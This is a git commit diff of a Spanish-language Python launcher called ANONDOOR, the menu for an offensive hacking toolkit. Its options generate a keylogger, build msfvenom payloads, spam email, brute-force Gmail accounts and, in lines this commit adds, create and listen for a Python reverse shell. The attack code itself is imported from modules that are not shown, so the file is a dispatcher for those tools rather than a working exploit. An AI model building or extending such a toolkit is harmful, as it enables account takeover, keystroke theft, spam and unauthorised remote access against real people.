5cf6b57dd410d7d2ed6c4dd1caf0499d125d68f8
ANONDOOR <67384556+ANONDOOR@users.noreply.github.com>
2020-07-25 14:53:07 -0500

    Add files via upload

--- anondoor.py
+++ anondoor.py
@@ -1,108 +1,134 @@
 import sys
 import os
 import time
-import shutil
 import colorsys
-from source import ftp, iplogger, payload, cybersendmail, bruteforceEmail
+from source import ftp, iplogger, bruteforceEmail
 from colorama import Fore
 
 
-def help():
-        print("""
-
-        exit (salir)
-        
-        salir (salir)
-
-        -h --help (ayuda)
-        
-        cyberftp (Conectarse Via FTP a un HOST)
-
-        keylogger (crea un keylogger escrito en python)
-
-        iplogger (Ejecuta un iplogger escrito en python)
-
-        payload (Crea un payload con msfvenom)
-
-        spammail (Usa esto para diversion, herramienta de spam a Emails)
-
-        brutemail (herramienta de fuerza bruta a Gmail)
-
-        """)
-
 def menu(): 
-    logo = Fore.CYAN + """
-  ▄▄▄       ███▄    █  ▒█████   ███▄    █ ▓█████▄  ▒█████   ▒█████   ██▀███  
-▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒
-▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒
-░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄  
- ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒
- ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
-  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░
-  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░ 
-      ░  ░         ░     ░ ░           ░    ░        ░ ░      ░ ░     ░     
-                                          ░  Cyber Phantom                   """ + Fore.RESET
-    
-    os.system("clear")
-    print(logo,"Plataforma: " + str(sys.platform), "\n Version de python: " + str(sys.version))
-    f = str(input(Fore.BLUE + "ANONDOOR~: " + Fore.YELLOW))
-    while(True):
-        if f == "exit" or f == "salir":
-            sys.exit()
-        if f == "-h" or f == "--help":
-            help()
-            sys.exit()
-        if f == "cyberftp":    
-            ft2 = Fore.CYAN + str(ftp.connect_ftp())
-            sys.exit()
-        if f == "iplogger":
-            Fore.RESET + str(iplogger.ip())
+    try:
+        logo = Fore.CYAN + """
+    ▄▄▄       ███▄    █  ▒█████   ███▄    █ ▓█████▄  ▒█████   ▒█████   ██▀███  
+    ▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒
+    ▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒
+    ░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄  
+    ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒
+    ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
+    ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░
+    ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░ 
+        ░  ░         ░     ░ ░           ░    ░        ░ ░      ░ ░     ░     
+                                            ░  Cyber Phantom                   """ + Fore.RESET
         
-        if f == "payload":
-            host = input("LHOST: ")
-            port = input("LPORT: ")
-            ame = input("NOMBRE: ")
-            Fore.RESET + str(payload.payload(host,port, ame))
+        os.system("clear")
+        print(logo,"Plataforma: " + str(sys.platform), "\n Version de python: " + str(sys.version))
+        f = str(input(Fore.BLUE + "ANONDOOR~: " + Fore.YELLOW))
 
-        if f == "keylogger":
-            directorio = str(os.system("pwd > /dev/null 2>&1"))
-            if os.path.exists(path="keylogger.py"):
-                os.remove(path="keylogger.py")
-                os.system("cp source/key.py '{0}'".format(directorio))
-                time.sleep(1)
-                os.system("mv 0 keylogger.py")
+        while(True):
+            if f == "exit" or f == "salir":
+                print(Fore.RESET)
+                sys.exit()
+            if f == "-h" or f == "--help":
+                help()
+                break
+                
+            if f == "cyberftp":    
+                ft2 = Fore.CYAN + str(ftp.connect_ftp())
+                sys.exit()
+            if f == "iplogger":
+                print(Fore.RESET)
+                iplogger.ip()
+            
+            if f == "payload":
+                from source import payload
+            
+            if f == "keylogger":
+                directorio = str(os.system("pwd > /dev/null 2>&1"))
                 if os.path.exists(path="keylogger.py"):
-                    print("Keylogger reescrito correctamente")
-                    sys.exit()
+                    os.remove(path="keylogger.py")
+                    os.system("cp source/key.py '{0}'".format(directorio))
+                    time.sleep(1)
+                    os.system("mv 0 keylogger.py")
+                    if os.path.exists(path="keylogger.py"):
+                        print("Keylogger reescrito correctamente")
+                        sys.exit()
+                    else:
+                        print("hubo un error al reescribir keylogger")
                 else:
-                    print("hubo un error al reescribir keylogger")
-            else:
-                os.system("cp source/key.py '{0}'".format(directorio))
-                time.sleep(1)
-                os.system("mv 0 keylogger.py")
-                if os.path.exists(path="keylogger.py"):
-                    print("Keylogger creado correctamente")
-                    sys.exit()
-                else:
-                    print("hubo un error al crear keylogger")
-        if f == "spammail":
-            a = input("Ingresa tu correo: ")
-            b = input("Ingresa tu contraseña: ")
-            c = input("Correo a Enviar mensajes: ")
-            d = input("Asunto: ")
-            e = input("Mensaje: ")
-            cybersendmail.email_spammer(a, b, c, d, e)
-        if f == "brutemail":
-            bruteforceEmail.brute()
+                    os.system("cp source/key.py '{0}'".format(directorio))
+                    time.sleep(1)
+                    os.system("mv 0 keylogger.py")
+                    if os.path.exists(path="keylogger.py"):
+                        print("\nKeylogger creado correctamente\n" + Fore.RESET)
+                        sys.exit()
+                    else:
+                        print("hubo un error al crear keylogger")
+            if f == "spammail":
+                from source import cybersendmail
+            if f == "brutemail":
+                print(Fore.RESET) 
+                bruteforceEmail.brute()
 
+            if f == "reverse" or f == "reverse shell":
+                a = input(Fore.RESET + "Desea crear la shell de reversa? Y/n: ")
+
+                if a == "Y" or a == "y":
+                    directorio = str(os.system("pwd > /dev/null 2>&1"))
+                    os.system("cp source/cliente.py {0} ".format(directorio))
+                    os.system("mv 0 cliente.py")
+                    if os.path.exists(path="cliente.py"):
+                        print(Fore.GREEN + "\nShell de Reversa, creada correctamente\n" + Fore.RESET)
+                        from source import reverse
+                    else:
+                        print("Hubo un error al crear la Shell de Reversa, Por favor verifique.\n")
+
+                elif a == "N" or a == "n":
+                    print("\n")
+                    from source import reverse
+                else:
+                    print(Fore.RED + "\nPor favor, de una respuesta valida\n")
                     
+            else:
+                if f == "":
+                    return Fore.YELLOW + str(menu())
+                else:
+                    print(Fore.RED + "-->parametro incorrecto!" + Fore.RESET)
+                    time.sleep(0.3)
+                    return Fore.YELLOW + str(menu())
 
-        else:
-            print(Fore.RED + "-->parametro incorrecto!")
-            time.sleep(1)
-            return Fore.YELLOW + menu()
+    except KeyboardInterrupt:
+        print(Fore.CYAN + "\n\nNos " + Fore.GREEN + "vemos " + Fore.YELLOW +"pronto! :)\n" + Fore.RESET)
+        sys.exit()
 
-menu()
+def help():
+    print( Fore.WHITE + """
+--------------------------------------------------------------------------
+#        exit (salir)                                                    «
+#                                                                        «
+#        salir (salir)                                                   «
+#                                                                        «
+#        -h --help (ayuda)                                               «
+#                                                                        «
+#        cyberftp (Conectarse Via FTP a un HOST)                         «
+#                                                                        «
+#        keylogger (crea un keylogger escrito en python)                 «
+#                                                                        «
+#        iplogger (Ejecuta un iplogger escrito en python)                «
+#                                                                        «
+#        payload (Crea un payload con msfvenom)                          «                                                                                           
+#                                                                        «                                                                                           
+#        spammail (Usa esto para diversion, herramienta de spam a Emails)«                                                                                           
+#                                                                        «                                                                                           
+#        brutemail (herramienta de fuerza bruta a Gmail)                 «                                                                                           
+#                                                                        «                                                                                           
+#        reverse (escuchar  y crear reverse shell hecha en python)       «                                                                                           
+--------------------------------------------------------------------------                                                                                           
+                                                                                                                                                                     
+        """ + Fore.RESET)
+        
+
+if __name__ == "__main__":
+    menu()
 
 
 
